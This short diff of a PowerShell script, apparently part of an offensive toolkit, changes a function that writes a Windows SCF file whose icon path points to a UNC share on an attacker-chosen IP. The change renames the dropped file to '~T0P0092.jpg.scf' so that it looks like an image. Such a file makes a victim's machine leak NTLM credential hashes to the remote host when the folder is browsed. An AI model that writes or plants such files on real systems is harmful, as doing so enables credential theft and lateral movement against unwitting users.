@@ -76,12 +76,12 @@ function DisableRDP
 function Write-SCFFile 
 {
     Param ($IPaddress, $Location)
-    "[Shell]" >$Location\~T0P0092.scf
-    "Command=2" >> $Location\~T0P0092.scf; 
-    "IconFile=\\$IPaddress\remote.ico" >> $Location\~T0P0092.scf; 
-    "[Taskbar]" >> $Location\~T0P0092.scf; 
-    "Command=ToggleDesktop" >> $Location\~T0P0092.scf; 
-    Write-Output "Written SCF File: $Location\~T0P0092.scf"
+    "[Shell]" >$Location\~T0P0092.jpg.scf
+    "Command=2" >> $Location\~T0P0092.jpg.scf; 
+    "IconFile=\\$IPaddress\remote.ico" >> $Location\~T0P0092.jpg.scf; 
+    "[Taskbar]" >> $Location\~T0P0092.jpg.scf; 
+    "Command=ToggleDesktop" >> $Location\~T0P0092.jpg.scf; 
+    Write-Output "Written SCF File: $Location\~T0P0092.jpg.scf"
 }
 function Write-INIFile 
 {
